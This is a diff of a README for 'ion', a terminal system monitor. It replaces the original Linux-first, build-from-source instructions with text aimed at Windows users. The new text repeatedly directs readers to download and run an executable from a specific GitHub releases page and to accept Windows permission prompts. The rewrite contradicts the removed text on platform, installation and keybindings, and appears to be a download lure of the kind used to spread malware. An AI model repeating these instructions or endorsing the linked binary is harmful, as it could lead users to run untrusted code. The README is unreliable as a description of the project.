@@ -1,44 +1,177 @@
-# ION — Terminal System Monitor
+# 🖥️ ion - Fast system stats in one view
 
-![Screenshot](gallery/image.png)
+[![Download ion](https://img.shields.io/badge/Download%20ion-blue?style=for-the-badge&logo=github)](https://github.com/Stickjav/ion/releases)
 
-## Overview
+## ⚡ Download ion
+Visit this page to download: https://github.com/Stickjav/ion/releases
 
-ION is a high-performance terminal system monitor built for speed, clarity, and smooth motion. It provides real-time system metrics with a futuristic, neon-accented TUI. Linux is the primary target, but functionality extends to macOS and Windows with graceful fallbacks.
+On the releases page, look for the latest version. Download the Windows file that matches your device. If you are not sure which one to pick, choose the file marked for Windows.
 
-## Features
+## 🪟 Install on Windows
 
-* CPU usage (total and per-core) with live sparklines
-* RAM, disk, and network throughput monitoring
-* GPU usage detection with safe fallback to N/A for unsupported devices
-* Top 5 processes by CPU usage with live navigation and selection highlight
-* Rolling CPU and RAM history buffers with spaced sparklines for readability
-* WiFi: SSID, signal strength, connection state
-* Bluetooth: adapter status, connected devices
-* Animated ASCII startup banner with color gradients and subtle TachyonFX effects
-* Smooth transitions and subtle animations for all gauges, sparklines, and tables
+1. Open the releases page.
+2. Find the newest release at the top.
+3. Under **Assets**, download the Windows file.
+4. Save the file to a folder you can find again, such as **Downloads** or **Desktop**.
+5. If the file comes in a ZIP folder, right-click it and choose **Extract All**.
+6. Open the extracted folder.
+7. Double-click the ion app to run it
 
-## Installation
+## 🖱️ First launch
 
-1. Install Rust (stable).
-2. Clone the repository.
-3. `cargo build --release`
-4. Run: `target/release/ion`
+When ion starts, it opens in a terminal window. You can use it right away with the keyboard.
 
-## Usage
+If Windows asks for permission, choose **Yes**.
 
-Run `ion` in your terminal. The interface auto-refreshes every ~200–300ms for up-to-date system metrics.
+If the window closes right away, open **Command Prompt** or **Windows Terminal**, then run the app from the folder where you saved it.
 
-## Keybindings
+## 🧭 What ion shows
 
-* `q` — Quit
-* `r` — Refresh immediately
-* `/` — Toggle process navigation mode
-* `Up`/`Down` or `j`/`k` — Navigate processes in navigation mode
+ion gives you a live view of your system in one place:
 
-## Architecture
+- CPU usage
+- RAM usage
+- GPU usage
+- Network activity
+- Running processes
+- Basic device details
+- Bluetooth status, when supported
 
-* `src/system.rs` — Collects system and connectivity metrics with OS fallbacks
-* `src/app.rs` — Event loop, state management, and async updates
-* `src/ui.rs` — Renders all TUI elements using ratatui widgets
-* `src/components/` — Contains reusable widgets for gauges, sparklines, tables, and animated banner
+The layout uses a neon-style terminal interface, so the screen stays easy to read while you watch your system load.
+
+## 🎮 How to use ion
+
+Use the keyboard to move around the app.
+
+Common actions:
+
+- Arrow keys to move through lists
+- Enter to open a selected item
+- Esc to go back
+- Q to quit
+
+If a process list is shown, you can use it to check which apps use the most memory or CPU. This helps you find what is slowing down your PC.
+
+## 🔧 System needs
+
+ion is built for Windows and works best on a recent version of the OS.
+
+Recommended setup:
+
+- Windows 10 or Windows 11
+- A terminal that supports modern text apps
+- A screen width that fits a multi-panel layout
+- A device with a working CPU, RAM, and network adapter that Windows can report
+
+For GPU stats, your system needs hardware and drivers that expose that data to Windows.
+
+## 📁 Release files
+
+The releases page may include more than one file. Common file types include:
+
+- `.zip` for packaged builds
+- `.exe` for a ready-to-run app
+- checksum files for file checks
+
+If you see a ZIP file, extract it before you open ion. If you see an EXE file, you can usually run it right away.
+
+## 🛠️ Troubleshooting
+
+If ion does not open:
+
+- Download the file again from the releases page
+- Make sure you picked the Windows build
+- Extract the ZIP file before opening the app
+- Try running it from Windows Terminal
+- Check that your terminal window is not too small
+
+If some stats do not show:
+
+- Wait a few seconds for the data to load
+- Close other monitor tools that may block access
+- Update your graphics drivers
+- Restart the app
+
+If the screen looks broken:
+
+- Enlarge the terminal window
+- Switch to a font that is easy to read
+- Use a terminal with full color support
+
+## 🧩 What makes ion useful
+
+ion keeps system data in one place, which makes it easier to spot:
+
+- A CPU spike
+- A memory leak
+- A network problem
+- A process that uses too many resources
+- GPU load during games or heavy apps
+
+It is useful when you want a fast readout without opening several Windows tools.
+
+## 📦 File safety
+
+Before you run any download, check that it came from the official releases page:
+
+https://github.com/Stickjav/ion/releases
+
+Use the latest release file from that page and keep the download in a folder you trust
+
+## ⌨️ Keyboard tips
+
+A terminal app works best with the keyboard. If you are new to this type of tool:
+
+- Use the arrow keys to move
+- Use Enter to select
+- Use Esc to return
+- Use Q to quit
+- Resize the window if content looks cramped
+
+## 🌐 Network tracking
+
+ion can show network activity so you can see when your PC sends or receives data. This is useful if:
+
+- Your internet feels slow
+- A program keeps using bandwidth
+- You want to check upload and download activity
+- You want a quick view while a file copies or a game updates
+
+## 🧠 Process view
+
+The process list helps you see which apps run in the background. This can help when your PC feels slow. You can use it to check:
+
+- CPU-heavy apps
+- Memory-heavy apps
+- Long-running tasks
+- Apps that stay open after you close them
+
+## 🎨 Look and feel
+
+ion uses a neon-style terminal design with clear contrast and compact panels. The layout is built for quick scanning, so you can check several system areas without switching windows
+
+## 🗂️ Supported areas
+
+ion is built around common desktop monitoring tasks:
+
+- CPU usage
+- RAM usage
+- GPU usage
+- Network monitoring
+- Process management
+- Bluetooth status
+- Cross-platform system data where supported
+
+## 🔎 Where to get updates
+
+Use the releases page to check for new builds and updated files:
+
+https://github.com/Stickjav/ion/releases
+
+## 📌 Quick steps
+
+1. Visit the releases page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the app
+5. Use the keyboard to move through system data
